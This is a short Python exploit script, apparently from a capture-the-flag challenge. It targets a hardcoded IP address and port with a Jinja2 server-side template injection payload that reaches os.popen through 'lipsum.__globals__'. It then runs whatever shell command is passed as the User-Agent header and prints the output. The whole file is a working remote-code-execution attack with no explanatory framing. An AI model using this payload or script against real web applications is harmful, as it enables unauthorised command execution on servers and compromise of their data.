import requests
import re
import sys

url = "http://103.152.242.116:6712/"

payload = '{{lipsum.__globals__.os.popen(request.user_agent.string).read()}}'

r = requests.get(url+payload, headers={
    "User-Agent": sys.argv[1],
    "Host": sys.argv[1]
})

print(r.text)